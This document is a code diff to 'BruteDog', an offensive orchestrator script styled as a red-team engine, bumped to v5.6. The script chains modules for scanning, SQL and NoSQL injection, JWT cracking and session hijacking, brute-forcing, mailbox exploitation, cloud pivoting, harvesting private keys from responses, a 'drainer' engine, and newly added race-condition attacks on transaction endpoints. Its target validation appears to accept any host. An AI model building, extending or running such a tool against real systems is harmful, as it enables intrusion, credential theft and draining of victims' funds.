@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG V5.3 — LIVE SECURITY ASSESSMENT & RED-TEAM ORCHESTRATION ENGINE
+BRUTEDOG V5.6 — LIVE SECURITY ASSESSMENT & RED-TEAM ORCHESTRATION ENGINE
 Main Orchestrator:
 - Pre-flight DNS and target scope validation
 - Network reconnaissance & port scanning
 - Source intelligence & credential exposure parsing
 - Autonomous multi-protocol brute-forcing, cloud pivoting, and replaying
+- High-concurrency race condition and logic fuzzing integration
 - Live terminal streaming with zero-disk memory persistence
 """
 import asyncio
@@ -18,13 +19,13 @@ from urllib.parse import urlsplit
 # Import framework modules
 from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
+from modules.race_condition import run_race_condition_test
 from modules.drainer import run_drainer_engine
 from modules.parser import parse_target_source
 from modules.scanner import run_port_scanner
 from modules.engine import run_autonomous_engine
 from modules.replayer import replay_and_inject_payloads
 from modules.bruter import execute_active_assault_engine
-from modules.no_sql_prototype import run_nosql_assault
 from modules.cloud_apex import run_cloud_apex
 from modules.pivot import run_pivot_engine
 from modules.dumper import harvest_email_intelligence
@@ -54,7 +55,7 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
  ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██████╔╝
 {RESET}{NEON_BLUE}
 ════════════════════════════════════════════════════════════
-        BRUTEDOG V5.3 — LIVE RED-TEAM SECURITY ORCHESTRATION
+        BRUTEDOG V5.6 — LIVE RED-TEAM SECURITY ORCHESTRATION
         AUTONOMOUS OFFENSIVE ENGINE / LIVE TERMINAL STREAMING
 ════════════════════════════════════════════════════════════
 {RESET}
@@ -99,7 +100,6 @@ def normalize_target(raw_target):
         "idna"
     ).decode("ascii").lower()
     
-    # Dynamic acceptance of any valid target domain or IP
     if not hostname:
         raise ValueError("Invalid target hostname.")
         
@@ -183,7 +183,7 @@ async def async_main():
     started = time.monotonic()
     print("\033[2J\033[H")
     print(BANNER)
-    log("[SYSTEM] BruteDog Active Orchestrator Initialized.")
+    log("[SYSTEM] BruteDog Active Orchestrator Initialized (v5.6).")
 
     # --------------------------------------------------------
     # TARGET INPUT
@@ -246,7 +246,6 @@ async def async_main():
         parser_result = await asyncio.to_thread(parse_target_source, target["url"])
         display_parser_results(parser_result)
 
-        # Harvest cryptographic secrets from response payload data
         response_blob = str(parser_result)
         harvest_private_keys(response_blob)
     except Exception as exc:
@@ -266,20 +265,23 @@ async def async_main():
         log(f"[ENGINE ERROR] {exc}", RED)
 
     # --------------------------------------------------------
-    # PHASE 4 — AGGRESSIVE DB ASSAULT & SESSION HIJACKING
+    # PHASE 3.5 — AGGRESSIVE DB ASSAULT, SESSION HIJACKING & RACE CONDITIONS
     # --------------------------------------------------------
-    section("PHASE 3.5 — AGGRESSIVE DB ASSAULT & SESSION HIJACKING")
+    section("PHASE 3.5 — AGGRESSIVE DB ASSAULT, SESSION HIJACKING & CONCURRENCY")
     try:
         display_progress("Executing time-based blind SQLi and NoSQL operator injection.")
-        await run_nosql_assault(target["url"])
+        await run_nosql_assault(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
 
         display_progress("Executing JWT secret cracking and cookie privilege escalation fuzzing.")
-        await run_session_hijack(target["url"])
+        await run_session_hijack(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+
+        display_progress("Firing high-concurrency race condition threads against transaction endpoints.")
+        await run_race_condition_test(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
     except Exception as exc:
-        log(f"[EXPLOIT ERROR] {exc}", RED)
+        log(f"[EXPLOIT/CONCURRENCY ERROR] {exc}", RED)
 
     # --------------------------------------------------------
-    # PHASE 5 — MULTI-PROTOCOL BRUTE-FORCE & MAILBOX EXPLOITATION
+    # PHASE 4 — MULTI-PROTOCOL BRUTE-FORCE & MAILBOX EXPLOITATION
     # --------------------------------------------------------
     section("PHASE 4 — MULTI-PROTOCOL & MAILBOX EXPLOITATION")
     try:
@@ -292,7 +294,7 @@ async def async_main():
         log(f"[BRUTE ERROR] {exc}", RED)
 
     # --------------------------------------------------------
-    # PHASE 6 — CLOUD INFRASTRUCTURE PIVOT & LIQUIDITY AUDIT
+    # PHASE 5 — CLOUD INFRASTRUCTURE PIVOT & LIQUIDITY AUDIT
     # --------------------------------------------------------
     section("PHASE 5 — CLOUD INFRASTRUCTURE & LIQUIDITY AUDIT")
     try:
